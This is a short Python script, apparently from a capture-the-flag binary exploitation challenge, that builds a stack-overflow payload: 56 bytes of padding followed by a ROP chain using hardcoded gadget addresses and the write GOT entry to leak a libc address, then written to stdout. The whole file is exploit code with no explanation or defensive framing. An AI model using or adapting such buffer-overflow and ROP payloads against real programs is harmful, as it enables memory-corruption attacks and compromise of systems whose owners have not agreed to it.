import sys

def b(x):
    return x.to_bytes(8, "little")


offset = 56

pop_rdi = 0x0000000000400703
pop_rsi_r15 = 0x0000000000400701
# write_got = exe.got["write"]
write_got = 0x0000000000601018
# main = exe.symbols["main"]
main = 0x000000000040062E
# ret = rop.find_gadget(["ret"])[0]
ret = 0x000000000040048E

# Leak libc address
payload = b""
payload = b"A" * offset
payload += b(pop_rsi_r15)
payload += b(write_got)
payload += b(0x4141414141414141)
payload += b(0x0000000000400676)

sys.stdout.buffer.write(payload)
